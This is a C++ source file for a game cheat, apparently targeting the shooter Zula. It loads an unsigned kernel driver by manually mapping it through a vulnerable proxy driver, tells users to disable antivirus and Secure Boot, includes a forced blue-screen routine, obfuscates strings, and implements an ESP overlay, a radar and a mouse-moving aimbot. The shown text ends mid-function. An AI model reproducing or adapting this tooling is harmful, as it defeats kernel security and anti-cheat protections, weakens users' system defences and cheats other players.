#define _CRT_SECURE_NO_WARNINGS
#pragma warning( disable : 4995 )
#pragma warning( disable : 4616 )
#pragma warning( disable : 3491 )
#pragma warning( disable : 1097 )
#pragma warning( disable : 4244 )
#pragma warning( disable : 4477 )
#pragma warning( disable : 4101 )
#pragma warning( disable : 4002 )
#pragma warning( disable : 4305 )
#pragma warning( disable : 4018 )
#pragma warning( disable : 4312 )
#pragma warning( disable : 4313 )
#pragma warning( disable : 4018 )
#pragma warning( disable : 4005 )
#pragma warning( disable : 4102 )
#pragma warning( disable : 4267 )
#pragma warning( disable : 4715 )
#pragma warning( disable : 8015 )

#include <iostream>
#include <assert.h>
#include "System.h"
#include "CapcomDriverManualMapper.h"
#include "SanityChecker.h"

#include "JUNK.h"
#include <windows.h>
#include <atlimage.h>
#include <comutil.h>
#include <filesystem>
#include <stdio.h>
#include "Console.h"
#include "Includes.h"
#include "DriverFunctions.h"
#include "Overlay.h"
#include <cassert>
#include "Vector.h"
#include "Loader.h"
#include "utils.hpp"
#include <direct.h>
#include "kdmapper.hpp"
#include "DriverCache.h"
using namespace std;
#include <Iphlpapi.h>
#include <Assert.h>
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "comsuppw.lib")
#pragma comment(lib,"WS2_32")
#pragma comment(lib, "ntdll.lib")

const int lengthOfBase64Chars = 64;

//BASE64 Karakterleri
const char base64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

PBITMAPINFO CreateBitmapInfoStruct(HBITMAP);
void CreateBMPFile(LPTSTR pszFile, HBITMAP hBMP);
//Bu fonksiyon basit bir matematikle Ýkilik tabandaki veriyi Onluk tabana çevirir.
int binaryToDecimal(string value) {

	int result = 0;

	for (int i = 0; i < value.length(); i++)
	{
		int digit = value[value.length() - i - 1] - '0';

		result = result + (digit * (pow(2, i)));
	}

	return result;
}

//Bu fonksiyon parametre aldýðý value deðerini 2. parametrede belirtilen formatta ikili veriye çevirir.
string decimalToBinary(int value, int digitFormat) {

	//divisonResult bir nevi temp deðiþkeni gibi görev alýyor ve ilk deðerini value deðerine eþitliyoruz.
	int divisionResult = value;

	//Her bölümden kalan bize binary verisinin hanesini verecektir.
	int calculatedDigit = divisionResult % 2;

	//Kalansýz bölme iþlemi yapýyoruz.
	divisionResult = (divisionResult - (divisionResult % 2)) / 2;

	//bulunan ilk hane binary verisini tutan stringe atanýyor.
	string binaryDataStr = to_string(calculatedDigit);

	//bölme iþlemi bölüm deðeri sýfýra eþit olana kadar devam ediyor
	while (divisionResult > 0) {

		calculatedDigit = divisionResult % 2;
		divisionResult = (divisionResult - (divisionResult % 2)) / 2;

		//sona doðru giderken bulduðumuz her binary verisinin hanesini stringin baþýna ekliyoruz.
		binaryDataStr = to_string(calculatedDigit) + binaryDataStr;
	}

	//Bu kod parçasý ile verinin kaç Bitlik formatta istenmiþse ona göre baþýna sýfýr(0) ekliyoruz.
	if (digitFormat != -1 && binaryDataStr.length() < digitFormat)
	{
		int requiredZeros = digitFormat - binaryDataStr.length();

		for (int i = 0; i < requiredZeros; i++)
		{
			binaryDataStr = "0" + binaryDataStr;
		}
	}

	return binaryDataStr; //string türünde oluþturduðumuz binary verisini döndürüyoruz.
}

//Bu fonksiyon parametre aldýðý karakterin Base64 dizesinde denk geldiði indeksi döndürür.
int getIndexOfBase64Char(char c) {

	for (int i = 0; i < lengthOfBase64Chars; i++)
	{
		if (base64chars[i] == c) {
			return i;
		}
	}

	return -1;
}
//Veriyi Base64 koduna çeviren fonksiyonumuz
string encodeString(string input) {

	// 1- Deðiþkenler ve kullanýcýdan verinin alýmý

	string girilenMetin = input; //Kullanýcýdan alýnan ve Base64 türüne çevrilecek metni tutacaðýmýz deðiþken

	string binaryData; //girilen metnin ASCII karþýlýlarýnýn ikili sisteme çevrilmiþ halini tutacak deðiþken

	int requiredExtraByte = 0; //baytlarýn tam bölünmesi için eklenmesi gereken byte sayýsýný tutacak deðiþken

	int* asciiKarsiliklari = (int*)malloc(sizeof(int) * girilenMetin.length()); //Girilen metindeki karakterlerin ASCII karþýlýðýný tutmak için girilen metin uzunluðunda int dizisi oluþturuyoruz.


	// 2- her karakterin ASCII karþýlýðýnýn diziye aktarýlmasý

	for (int i = 0; i < girilenMetin.length(); i++) //metin içindeki harflerin ascii karþýlýklarýný diziye aktarýyoruz.
	{
		asciiKarsiliklari[i] = girilenMetin[i]; //Karakterin ASCII karþýlýðýný alýyoruz.
	}


	// 3- binary verinin sonuna eklenmesi gereken extra byte sayýsýnýn hesaplanmasý

	//Metin uzunluðu 3'e tam bölünüyorsa extra bayt 0 oluyor.
	//Metin uzunluðu 3'e tam bölünmüyorsa 3 sayýsýndan metin uzunluðunun 3'e bölümünden kalaný çýkarýyoruz. Bu iþlemin sonucu bize gereken extra byte sayýsýný verir.
	requiredExtraByte = girilenMetin.length() % 3 == 0 ? 0 : 3 - girilenMetin.length() % 3;

	// 4- ASCII karþýlýklarýný binary türüne çevirip binary verimizi oluþturuyoruz.

	//Alttaki döngü ile ilk olarak girilen metnin ASCII karþýlýklarý binary türüne çevriliyor.
	//Ardýndan extra byte miktarýnda istenen kadar sýfýr ekliyoruz.
	//Örneðin, 2 tane extra byte gerekiyorsa aþaðýdaki fonksiyon ile 0000 0000 0000 0000 verisi ekleniyor.

	for (int i = 0; i < girilenMetin.length() + requiredExtraByte; i++)
	{
		if (girilenMetin.length() > i) {
			binaryData += decimalToBinary(asciiKarsiliklari[i], 8);
		}
		else//alt kýsýmda extra byte miktarý ekleniyor.
		{
			//2. deðiþken verinin 8 hanelik olarak döndürülmesini saðlýyor.
			binaryData += decimalToBinary(0, 8);
		}
	}

	// 5- Son aþamada encode edilmiþ verimizi oluþturuyoruz ve ekrana yazdýrýyoruz.

	string encodedData;

	for (int i = 0; i < binaryData.length(); i += 6) //her altýlýk Biti okuyacaðýmýz için altýþar altýþar okuyoruz.
	{
		string get6Digit = binaryData.substr(i, 6); //her altýlýk Biti alýyoruz.

		int toDecimal = binaryToDecimal(get6Digit); //alýnan altlýk Bitin onluk karþýlýðýný alýyoruz.

		//Burada verinin içine eklenmiþ ekstra Byte miktarý kadar eþittir(=) eklemek için basit bir matematiksel ifade kullandým.
		if (binaryData.length() - (requiredExtraByte * 8) > i)
		{
			//Base64 dizisinden karþýlýk gelen karakteri verimize ekliyoruz.
			encodedData += base64chars[toDecimal];
		}
		else
		{
			//Verinin sonuna eþittir ekliyoruz.
			encodedData += "=";
		}

	}

	return encodedData;
}

//Base64 kodunu çözen fonksiyonumuz
string decodeString(string input) { // TWE=

	//Kodu çözülmüþ veriyi tutacak deðiþken
	string decodedData = "";

	//Kodu çözerken oluþacak ikili veriyi tutacak deðiþken
	string binaryData = "";

	//Girilen kodlanmýþ veri 4'e tam bölünmüyorsa geçerli bir Base64 kodlamsý deðildir.
	if (input.length() % 4 != 0) return "!...Girilen Veri Gecerli Base64 Formatinda degil...!";

	//Kodlanmýþ verinin son karakterinin bulunduðu index
	int lastIndexCharOfInputStr = input.length() - 1;

	//Verinin sadece son 2 karakterini eþittir(=) sembolüne eþit mi diye kontrol ediyoruz.
	//Çünkü kodlanmýþ Base64 verisinde maksimum 2 tane eþittir(=) sembolü olabilir.
	if (input[lastIndexCharOfInputStr] == '=') {

		//Verinin son karakteri silen kod
		input.erase(lastIndexCharOfInputStr, 1);

		//Bir karakter sildik diye verinin son karakterinin bulunduðu indexi 1 azaltýyoruz.
		lastIndexCharOfInputStr--;

		//Verinin ilk haline göre sondan ikinci karakterin eþittir(=) sembolüne eþit mi diye kontrol ediyoruz.
		if (input[lastIndexCharOfInputStr] == '=')
		{
			//Verinin sondan ikinci karakterini silen kod
			input.erase(lastIndexCharOfInputStr, 1);
		}
	}

	// 2- Kodlanmýþ verideki her karakterin base64 kodlarýnda denk geldiði indeksin binary verisine çevrilmesi
	for (int i = 0; i < input.length(); i++)
	{
		//Karakterin Base64 dizesinde denk gelen indeksini alýyoruz.
		int index = getIndexOfBase64Char(input[i]);

		//Denk gelen indeksin 6 Bitlik halde binary halini verimize ekliyoruz.
		binaryData += decimalToBinary(index, 6);
	}


	// 3- Binary verisini 8'lik parçalara ayýrýp her parçanýn ifade ettiði sayýnýn ASCII karakter karþýlýðý diziye ekleniyor.

	//Bu döngü veriyi 8'er olarak atlýyor.
	for (int i = 0; i < binaryData.length(); i += 8)
	{
		//Bu kod ile 8 bitlik veri onluk tabana çevrilip ASCII karþýlýðý olan karakteri buluyoruz.
		char c = binaryToDecimal(binaryData.substr(i, 8));

		//Kodu çözülmüþ verinin sonuna bulduðumuz karakteri ekliyoruz.
		decodedData += c;
	}

	return decodedData;
}

LONG GetStringRegKey(HKEY hKey, const std::string& strValueName, std::string& strValue, const std::string& strDefaultValue)
{
	strValue = strDefaultValue;
	CHAR szBuffer[512];
	DWORD dwBufferSize = sizeof(szBuffer);
	ULONG nError;
	nError = RegQueryValueExA(hKey, strValueName.c_str(), 0, NULL, (LPBYTE)szBuffer, &dwBufferSize);
	if (ERROR_SUCCESS == nError)
	{
		strValue = szBuffer;
	}
	return nError;
}
std::string encrypt(std::string msg, std::string key)
{
	// Make sure the key is at least as long as the message
	std::string tmp(key);
	while (key.size() < msg.size())
		key += tmp;

	// And now for the encryption part
	for (std::string::size_type i = 0; i < msg.size(); ++i)
		msg[i] ^= key[i];
	return msg;
}
std::string decrypt(std::string msg, std::string key)
{
	return encrypt(msg, key); // lol
}
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
	PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);

void BlueScreen()
{
	BOOLEAN bl;
	ULONG Response;
	RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // Enable SeShutdownPrivilege
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown
}

BOOL RegDelnodeRecurse(HKEY hKeyRoot, LPTSTR lpSubKey)
{
	LPTSTR lpEnd;
	LONG lResult;
	DWORD dwSize;
	TCHAR szName[MAX_PATH];
	HKEY hKey;
	FILETIME ftWrite;

	// First, see if we can delete the key without having
	// to recurse.

	lResult = RegDeleteKey(hKeyRoot, lpSubKey);

	if (lResult == ERROR_SUCCESS)
		return TRUE;

	lResult = RegOpenKeyEx(hKeyRoot, lpSubKey, 0, KEY_READ, &hKey);

	if (lResult != ERROR_SUCCESS)
	{
		if (lResult == ERROR_FILE_NOT_FOUND) {
			//	printf("Key not found.\n");
			return TRUE;
		}
		else {
			//	printf("Error opening key.\n");
			return FALSE;
		}
	}

	// Check for an ending slash and add one if it is missing.

	lpEnd = lpSubKey + lstrlen(lpSubKey);

	if (*(lpEnd - 1) != TEXT('\\'))
	{
		*lpEnd = TEXT('\\');
		lpEnd++;
		*lpEnd = TEXT('\0');
	}

	// Enumerate the keys

	dwSize = MAX_PATH;
	lResult = RegEnumKeyEx(hKey, 0, szName, &dwSize, NULL,
		NULL, NULL, &ftWrite);

	if (lResult == ERROR_SUCCESS)
	{
		do {

			*lpEnd = TEXT('\0');
			StringCchCat(lpSubKey, MAX_PATH * 2, szName);

			if (!RegDelnodeRecurse(hKeyRoot, lpSubKey)) {
				break;
			}

			dwSize = MAX_PATH;

			lResult = RegEnumKeyEx(hKey, 0, szName, &dwSize, NULL,
				NULL, NULL, &ftWrite);

		} while (lResult == ERROR_SUCCESS);
	}

	lpEnd--;
	*lpEnd = TEXT('\0');

	RegCloseKey(hKey);

	// Try again to delete the key.

	lResult = RegDeleteKey(hKeyRoot, lpSubKey);

	if (lResult == ERROR_SUCCESS)
		return TRUE;

	return FALSE;
}
BOOL RegistryDeleteKey(HKEY hKeyRoot, LPCTSTR lpSubKey)
{
	TCHAR szDelKey[MAX_PATH * 2];

	StringCchCopy(szDelKey, MAX_PATH * 2, lpSubKey);
	return RegDelnodeRecurse(hKeyRoot, szDelKey);
}

#define M_PI                       3.14159265358979323846f

#define URotationToRadians(URotation)		((URotation)* (M_PI / 32768.0f))
#define URotationToDegree( URotation )		( ( URotation ) * ( 360.0f / 65536.0f ) ) 

#define DegreeToURotation( Degree )			( ( Degree ) * ( 65536.0f / 360.0f ) )
#define DegreeToRadian( Degree )			( ( Degree ) * ( M_PI / 180.0f ) )

#define RadianToURotation( URotation )		( ( URotation ) * ( 32768.0f / M_PI ) ) 
#define RadianToDegree( Radian )			( ( Radian ) * ( 180.0f / M_PI ) )
uint32_t LocalPlayer = NULL;
#define isLocalPlayer strstr(entity_handle.c_str(), XorString("FPS_")) && strstr(entity_handle.c_str(), XorString("_MESH.M"))
#define isPlayer strstr(entity_handle.c_str(), XorString("CHAR_")) && strstr(entity_handle.c_str(), XorString("MESH.MD"))
#define ZulaTeam strstr(entity_handle.c_str(), XorString("CHAR_HALIL")) || strstr(entity_handle.c_str(), XorString("CHAR_CEMAL")) || strstr(entity_handle.c_str(), XorString("CHAR_AZAD")) || strstr(entity_handle.c_str(), XorString("CHAR_DAYI")) || strstr(entity_handle.c_str(), XorString("CHAR_TAHIR")) || strstr(entity_handle.c_str(), XorString("CHAR_CETIN")) || strstr(entity_handle.c_str(), XorString("CHAR_OSMAN")) || strstr(entity_handle.c_str(), XorString("CHAR_SAMIL")) || strstr(entity_handle.c_str(), XorString("CHAR_CUMALI")) || strstr(entity_handle.c_str(), XorString("KADIN")) || strstr(entity_handle.c_str(), XorString("CHAR_BAHRAM"))
#define GladioTeam strstr(entity_handle.c_str(), XorString("CHAR_AZER")) || strstr(entity_handle.c_str(), XorString("CHAR_PIERRE")) || strstr(entity_handle.c_str(), XorString("CHAR_BOB")) || strstr(entity_handle.c_str(), XorString("CHAR_AVI")) || strstr(entity_handle.c_str(), XorString("CHAR_EDWARD")) || strstr(entity_handle.c_str(), XorString("CHAR_GEORGE")) || strstr(entity_handle.c_str(), XorString("CHAR_IVAN")) || strstr(entity_handle.c_str(), XorString("CHAR_JACK")) || strstr(entity_handle.c_str(), XorString("CHAR_ROSA")) || strstr(entity_handle.c_str(), XorString("CHAR_PABLO")) || strstr(entity_handle.c_str(), XorString("CHAR_MILLA"))
DWORD WINAPI A() // By Yuri-BR
{
	DWORD TimeTest1 = 0, TimeTest2 = 0;
	while (true)
	{
		TimeTest1 = TimeTest2;
		TimeTest2 = GetTickCount();
		if (TimeTest1 != 0)
		{
			Sleep(1000);
			if ((TimeTest2 - TimeTest1) > 5000)
			{
				ExitProcess(0);
				TerminateProcess(GetCurrentProcess(), 0);
			}
		}
	}
	return 0;
}
void DeleteHeaders(HINSTANCE hModule);
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam);
bool dc()
{
	//DeleteHeaders(GetModuleHandle(0));

	char windir[260];
	GetWindowsDirectory(windir, MAX_PATH);
	::EnumWindows(EnumWindowsProc, NULL);

	//BYTE a1[] = { 0x00 };
	//memcpy(kdrv_data, a1, sizeof(a1));
	const std::string drivers_path = windir + std::string(XorString("\\system32\\drivers\\"));
	const std::string driver_path = drivers_path + std::string(XorString("Microsoft_Msft_Intel.wdf"));
	remove(XorString("VSTXRAID.sys"));
	remove(driver_path.c_str());
	Console::Warning(XorString("Virus programini ve SecureBoot'u kapatman gerektigini unutma."));
	::EnumWindows(EnumWindowsProc, NULL);
	std::string a = XorString("\\\\.\\CFuckerDrv");
	//std::string a = XorString("\\\\.\\Microsoft_Kernel");
	J();
	drv = CreateFileA(a.c_str(), GENERIC_READ, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	//memset((void*)&a[0], 0x00, a.size() * 2);
	//a.clear();
	
	J();
	if (drv == INVALID_HANDLE_VALUE)
	{
		Console::Info(XorString("We are going to kernel!"));
		utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(kdrv_data), sizeof(kdrv_data));
		::EnumWindows(EnumWindowsProc, NULL);
		/*HANDLE iqvw64e_device_handle = intel_driver::Load();
		kdmapper::MapDriver(iqvw64e_device_handle, driver_path);
		remove(driver_path.c_str());
		intel_driver::Unload(iqvw64e_device_handle);*/
		remove(XorString("VSTXRAID.sys"));
		if (PathFileExistsA(XorString("VSTXRAID.sys")) == FALSE)
			CopyFile(std::string(drivers_path + XorString("VSTXRAID.sys")).c_str(), XorString("VSTXRAID.sys"), TRUE);

		const char* ProxyDriverName = XorString("VSTXRAID.sys");
		const char* TargetDriverName = driver_path.c_str();

		CapcomDriverManualMapper* mapper = 0;

		try
		{
			SanityChecker* checker = new SanityChecker(ProxyDriverName, TargetDriverName);
			Loader ProxyDriverLoader((CONST LPSTR)ProxyDriverName);
			ProxyDriverLoader.LoadDriver();
			ProxyDriverLoader.DeleteRegistryKey();
			auto ProxyDriverModuleBase = GetSystemModuleBaseAddress(ProxyDriverName);
			assert(ProxyDriverModuleBase);
			mapper = new CapcomDriverManualMapper(ProxyDriverName, TargetDriverName, ProxyDriverModuleBase + checker->GetOverwritableSectionOffset());
			mapper->map();
			mapper->~CapcomDriverManualMapper();
			remove(driver_path.c_str());
			Console::Success("Lutfen programi yeniden baslatin.");
			getchar();
			exit(-1);
			//return true;
		}
		catch (exception ex)
		{
			cout << XorString("Bilinmeyen hata -> ") << ex.what() << endl;
			cout << XorString("-- Unload driver yaziyorsa, bilgisayarinizi yeniden baslatip virus programini kapatin. (Windows defender, etc.)") << endl;
		}
		
		remove(driver_path.c_str());
		//HANDLE iqvw64e_device_handle = intel_driver::Load();
		//kdmapper::MapDriver(iqvw64e_device_handle, driver_path);
		//remove(driver_path.c_str());
		//intel_driver::Unload(iqvw64e_device_handle);
		//memset((void*)&kdrv_data, 0x00, sizeof(kdrv_data));
		
	}
	else
		return true;

	remove(driver_path.c_str());
	//kdrv_data
	//if (drv == INVALID_HANDLE_VALUE)
	//{
	//	const char* ProxyDriverName = XorString("VSTXRAID.sys");
	//	const char* TargetDriverName = XorString("");

	//	//char temp_directory[MAX_PATH] = { 0 };
	//	//GetTempPathA(sizeof(temp_directory), temp_directory);


	////	const std::string driver_path = std::string(temp_directory) + "\\" + driver_name;
	////	std::remove(driver_path.c_str());
	//	//const std::string driver_path =
	//	//utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver));
	//	qwerqwfavdDriverManualMapper* mapper = NULL;

	//	try
	//	{
	//		SanityChecker* checker = new SanityChecker(ProxyDriverName, TargetDriverName);

	//		Loader ProxyDriverLoader((CONST LPSTR)ProxyDriverName);

	//		if (!ProxyDriverLoader.LoadDriver())
	//		{
	//			string error = "Loading "; error += ProxyDriverName; error += " failed";
	//			throw exception(error.c_str());
	//		}

	//		ProxyDriverLoader.DeleteRegistryKey();

	//		auto ProxyDriverModuleBase = GetSystemModuleBaseAddress(ProxyDriverName);
	//		assert(ProxyDriverModuleBase);

	//		cout << "Mapping Driver..." << endl;

	//		mapper = new qwerqwfavdDriverManualMapper(ProxyDriverName, TargetDriverName, ProxyDriverModuleBase + checker->GetOverwritableSectionOffset());
	//		mapper->map();

	//		cout << TargetDriverName << " successfully was mapped" << endl;
	//	}
	//	catch (exception ex)
	//	{
	//		cout << "Exception Occured -> " << ex.what() << endl;
	//	}
	//	mapper->~qwerqwfavdDriverManualMapper();
	//	return true;
	//}
	//else
	//{
	//	return true;
	//}
}

D3DXMATRIX TempMatrix;
bool WorldToScreen(Vector WorldPos, Vector& Screen, D3DXMATRIX matrix)
{
	float z = WorldPos.x * matrix._13 + WorldPos.y * matrix._23 + WorldPos.z * matrix._33 + matrix._43;

	if (z < 0.0f)
		return false;

	float x = WorldPos.x * matrix._11 + WorldPos.y * matrix._21 + WorldPos.z * matrix._31 + matrix._41;
	float y = WorldPos.x * matrix._12 + WorldPos.y * matrix._22 + WorldPos.z * matrix._32 + matrix._42;

	x /= z;
	y /= z;

	Screen.x = (1.0f + x) * (Width / 2);
	Screen.y = (1.0f - y) * (Height / 2);

	return true;
}
void Box3D(Vector RootPos, RGBA* Color, int Thickness)
{
	auto a1 = RootPos.x;
	auto a2 = RootPos.z;
	auto a3 = RootPos.y;
	auto v7 = a1 - 16.3f;
	auto v8 = a2 - 43.f;
	auto v9 = a3 - 20.f;
	auto v10 = a1 + 17.f;
	auto v12 = a3 + 14.f;
	Vector line1, line2, line3, line4, line5, line6, line7, line8;
	if (WorldToScreen(Vector(v7, v8, v9), line1, TempMatrix))
	{
		auto v4 = a2 + 32.f;
		auto v11 = a2 + 32.f;
		auto v13 = v4;
		auto v14 = v4;
		if (WorldToScreen(Vector(v10, v4, v12), line2, TempMatrix))
		{
			if (WorldToScreen(Vector(v10, v8, v9), line3, TempMatrix))
			{
				if (WorldToScreen(Vector(v7, v11, v9), line4, TempMatrix))
				{
					if (WorldToScreen(Vector(v7, v8, v12), line5, TempMatrix))
					{
						if (WorldToScreen(Vector(v7, v13, v12), line6, TempMatrix))
						{
							if (WorldToScreen(Vector(v10, v8, v12), line7, TempMatrix))
							{
								if (WorldToScreen(Vector(v10, v14, v9), line8, TempMatrix))
								{
									DrawLine(line1.x, line1.y, line4.x, line4.y, Color, Thickness);
									DrawLine(line3.x, line3.y, line8.x, line8.y, Color, Thickness);
									DrawLine(line7.x, line7.y, line2.x, line2.y, Color, Thickness);
									DrawLine(line5.x, line5.y, line6.x, line6.y, Color, Thickness);

									//Chan
									DrawLine(line1.x, line1.y, line3.x, line3.y, Color, Thickness);
									DrawLine(line3.x, line3.y, line7.x, line7.y, Color, Thickness);
									DrawLine(line7.x, line7.y, line5.x, line5.y, Color, Thickness);
									DrawLine(line5.x, line5.y, line1.x, line1.y, Color, Thickness);

									//Dau
									DrawLine(line4.x, line4.y, line8.x, line8.y, Color, Thickness);
									DrawLine(line8.x, line8.y, line2.x, line2.y, Color, Thickness);
									DrawLine(line2.x, line2.y, line6.x, line6.y, Color, Thickness);
									DrawLine(line6.x, line6.y, line4.x, line4.y, Color, Thickness);
								}
							}
						}
					}
				}
			}
		}
	}
}
Vector ViewAngles(uint32_t Entity)
{
	return readmem<Vector>(Entity + 0x3E8);// X: Yaw | Y: Pitch
}

D3DXVECTOR2 WorldRadar(Vector srcPos, Vector distPos, float yaw, float radarX, float radarY, float size)
{
	auto cosYaw = cos(DegreeToRadian(-yaw));
	auto sinYaw = sin(DegreeToRadian(-yaw));

	auto deltaX = srcPos.x - distPos.x;
	auto deltaY = srcPos.y - distPos.y;

	auto locationX = (float)(deltaY * cosYaw + deltaX * sinYaw) / size;
	auto locationY = (float)(deltaX * cosYaw - deltaY * sinYaw) / size;

	if (locationX > size - 2.f)
		locationX = size - 2.f;
	else if (locationX < -(size - 2.f))
		locationX = -(size - 2.f);

	if (locationY > size - 12.f)
		locationY = size - 12.f;
	else
		if (locationY < -(size - 12.f))
			locationY = -(size - 12.f);

	return D3DXVECTOR2((int)(locationX + radarX), (int)(locationY + radarY));
}

void DrawRadar( Vector LocalPos, Vector EntityPos, RGBA* EntityColor )
{
	auto radar_posX = pRadar.x + 155;
	auto radar_posY = pRadar.y + 165;

	auto Radar2D = WorldRadar(LocalPos, EntityPos, ViewAngles(LocalPlayer).x, radar_posX, radar_posY, 60.f);// radar pos

	DrawCircleFilled(Radar2D.x, Radar2D.y, enemy_size, EntityColor, 10);
}


inline float Distance(Vector LocalPos, Vector EnemyPos)
{
	return float(sqrtf(powf(EnemyPos.x - LocalPos.x, 2.0) + powf(EnemyPos.z - LocalPos.z, 2.0) + powf(EnemyPos.y - LocalPos.y, 2.0)));
}

int GetDistance(Vector v1, Vector v2, int Divide)
{
	Vector vector3;
	vector3.x = v1.x - v2.x;
	vector3.y = v1.y - v2.y;
	vector3.z = v1.z - v2.z;
	return (int)sqrt(pow((double)vector3.x, 2.0) + pow((double)vector3.y, 2.0) + pow((double)vector3.z, 2.0)) / Divide;
}


DWORD AimbotKey = VK_LSHIFT;
bool GetAimKey()
{
	if (AimbotKey != NULL)
		return (GetAsyncKeyState(AimbotKey));
	else
		return true;
}
int CLeft(float dwx, float dwy) {

	INPUT Inputs[3] = { 0 };
	Inputs[0].type = INPUT_MOUSE;
	Inputs[0].mi.dx = (LONG)dwx; // desired X coordinate
	Inputs[0].mi.dy = (LONG)dwy; // desired Y coordinate
	Inputs[0].mi.dwFlags = MOUSEEVENTF_MOVE;

	SendInput(3, Inputs, sizeof(INPUT));
	return true;
}

bool mouse_move(int x, int y)
{
	INPUT input;
	input.type = INPUT_MOUSE;
	input.mi.mouseData = 0;
	input.mi.time = 0;
	input.mi.dx = x * (65536 / GetSystemMetrics(SM_CXSCREEN));//x being coord in pixels
	input.mi.dy = y * (65536 / GetSystemMetrics(SM_CYSCREEN));//y being coord in pixels
	input.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_VIRTUALDESK | MOUSEEVENTF_ABSOLUTE;
	SendInput(1, &input, sizeof(input));
	return true;
}

float DistanceBetweenCross(float X, float Y)
{
	float ydist = (Y - (Height / 2));
	float xdist = (X - (Width / 2));
	float Hypotenuse = sqrt(pow(ydist, 2) + pow(xdist, 2));
	return Hypotenuse;
}

bool GetClosestPlayerToCrossHair(Vector Pos, float& max, float aimfov)
{
	float Dist = DistanceBetweenCross(Pos.x, Pos.y);
	if (Dist < max)
	{
		max = Dist;
		AimFOV = aimfov;
		return true;
	}
	return false;

}
static bool InsideCircle(int xc, int yc, int r, int x, int y)
{
	int dx = xc - x;
	int dy = yc - y;
	return dx * dx + dy * dy <= r * r;
}

static void VectorAngles(const Vector& forward, Vector& angles)
{
	if (forward.y == 0.0f && forward.x == 0.0f)
	{
		angles.x = (forward.z > 0.0f) ? 75.0f : -75.0f; // Pitch (up/down)
		angles.y = 0.0f;  //yaw left/right
	}
	else
	{
	angles.x = atan2(forward.z, forward.Length2D()) * -180 / M_PI;
	angles.y = atan2(forward.y, forward.x) * 180 / M_PI;

	//printf("X: %.f || Y: %.f || Z: %.f\n", angles.x, angles.y, angles.z);
	if (angles.y > 75)
		angles.y -= 180;
	else if (angles.y < 75)
		angles.y += 180;
	else if (angles.y == 75)
		angles.y = 0;
	angles.z = 0.0f;
	}
	angles.z = 0.0f;
}

std::string random_numb()
{
	static const std::string allowed_chars{ "012345" };

	static thread_local std::default_random_engine randomEngine(std::random_device{}());
	static thread_local std::uniform_int_distribution<int> randomDistribution(0, allowed_chars.size() - 1);

	std::string id(1 ? 1 : 32, '\0');

	for (std::string::value_type& c : id) {
		c = allowed_chars[randomDistribution(randomEngine)];
	}

	return id;
}
string random_aimbone() {
	string mac = random_numb();
	if (mac == "0") return XorString("HITBOX_HEAD.MDL");
	if (mac == "1") return XorString("HITBOX_HEAD.MDL");
	if (mac == "2") return XorString("HITBOX_HEAD.MDL");
	if (mac == "3") return XorString("HITBOX_SPINE2.MDL");
	if (mac == "4") return XorString("HITBOX_SPINE2.MDL");
	if (mac == "5") return XorString("HITBOX_SPINE2.MDL");
}
static Vector CalcAngle(Vector src, Vector dst)
{
	Vector angles;
	Vector delta = src - dst;
	//delta.Normalize();
	VectorAngles(delta, angles);
	return Vector(angles.y, angles.x, angles.z);
}

Vector GetViewAngle()
{
	auto angle = readmem<Vector>(MemoryBase + 0x1CA1D24);
	return angle;
}
Vector GetCameraPos()
{
	auto angle = readmem<Vector>(LocalPlayer + 0x3DC);
	return angle;
}
//void SetViewAngle(Vector angle)
//{
//	__try
//	{
//		writemem(MemoryBase + 0x1CA1D24, &angle, sizeof(angle));
//	}
//	__except(1){}
//}


static void SinCos(float radians, float* sine, float* cosine)
{
	*sine = (float)sin(radians);
	*cosine = (float)cos(radians);
}

void AngleVectors(const Vector& angles, Vector* forward)
{
	float	sp, sy, cp, cy;

	SinCos(DegreeToRadian(angles.x), &sy, &cy);
	SinCos(DegreeToRadian(angles.y), &sp, &cp);

	forward->x = cp * cy;
	forward->y = cp * sy;
	forward->z = -sp;
}
static void xasdasdascsa()
{
	float TargetX = 0;
	float TargetY = 0;
	//uint32_t MemoryBase = readmem<uint32_t>(0x10226708);
	//Vector RootPos = readmem<Vector>(entityx + 0x3DC);
	//int visible_check = readmem<int>(entityx + 0x34);
	//if (visible_check == 512)
	//{
	Vector RootPos = readmem<Vector>(entityx + 0x3DC);
	//RootPos.z += 2.f;
	Vector spos2; WorldToScreen(Vector(RootPos.x, RootPos.z, RootPos.y), spos2, TempMatrix);
	//if (InsideCircle((int)ScreenCenterX, (int)ScreenCenterY, AimFOV, (int)spos2.x, (int)spos2.y))
	//	{
	int visible_check = readmem<int>(entityx + 0x34);
	if (visible_check != 67109648)
	{
		if (spos2.x != 0 || spos2.y != 0)
		{
			if (DistanceBetweenCross(spos2.x, spos2.y) || isaimbotting)
			{
				//X Axis
				if (spos2.x != 0)
				{
					if (spos2.x > ScreenCenterX)
					{
						TargetX = -(ScreenCenterX - spos2.x);
						TargetX /= AimSpeed;
						if (TargetX + ScreenCenterX > ScreenCenterX * 2) TargetX = 0;
					}

					if (spos2.x < ScreenCenterX)
					{
						TargetX = spos2.x - ScreenCenterX;
						TargetX /= AimSpeed;
						if (TargetX + ScreenCenterX < 0) TargetX = 0;
					}
				}

				//Y Axis
				if (spos2.y != 0)
				{
					if (spos2.y > ScreenCenterY)
					{
						TargetY = -(ScreenCenterY - spos2.y);
						TargetY /= AimSpeed;
						if (TargetY + ScreenCenterY > ScreenCenterY * 2) TargetY = 0;
					}

					if (spos2.y < ScreenCenterY)
					{
						TargetY = spos2.y - ScreenCenterY;
						TargetY /= AimSpeed;
						if (TargetY + ScreenCenterY < 0) TargetY = 0;
					}
				}
				CLeft((int)TargetX, (int)TargetY);
			}
		}
	}
}
	//}


	//int visible_check = readmem<int>(entityx + 0x34);
	//if (visible_check != 67109648)
	//{
	//	Vector LocalPos = readmem<Vector>(LocalPlayer + 0x3DC);
